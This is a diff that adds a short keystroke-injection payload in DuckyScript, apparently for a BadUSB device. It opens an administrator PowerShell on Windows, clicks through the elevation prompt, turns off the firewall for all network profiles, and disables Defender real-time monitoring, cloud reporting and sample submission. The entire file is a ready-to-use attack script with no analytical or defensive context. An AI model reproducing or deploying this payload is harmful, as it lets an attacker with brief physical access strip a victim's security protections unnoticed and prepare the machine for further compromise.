@@ -1,0 +1,33 @@
+DELAY 1000
+
+GUI x
+DELAY 1000
+STRING a
+ENTER
+DELAY 1500
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 1500
+
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 500
+
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+
+STRING Set-MpPreference -MAPSReporting 0
+ENTER
+DELAY 500
+
+STRING Set-MpPreference -SubmitSamplesConsent 0
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 500
+ENTER
